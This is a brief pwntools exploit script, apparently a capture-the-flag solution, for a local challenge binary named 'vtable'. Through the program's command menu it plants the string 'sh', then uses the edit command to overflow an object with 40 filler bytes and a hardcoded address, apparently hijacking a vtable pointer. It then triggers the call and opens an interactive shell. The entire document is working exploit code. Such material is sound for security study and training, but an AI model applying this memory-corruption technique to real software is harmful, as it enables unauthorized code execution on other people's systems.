from pwn import *

r = process("./pwn4/vtable")

def talk(prompt, cmd):
    r.recvuntil(prompt + ":\n")
    r.sendline(cmd)

talk("Command", "print")
talk("Say", "hello")
talk("Command", "print")
talk("Say", "sh")
talk("Command", "edit")
talk("Object id", "0")
talk("Say", "a" * 40 + p32(0x402350) + "\n");
talk("Command", "do")
r.interactive()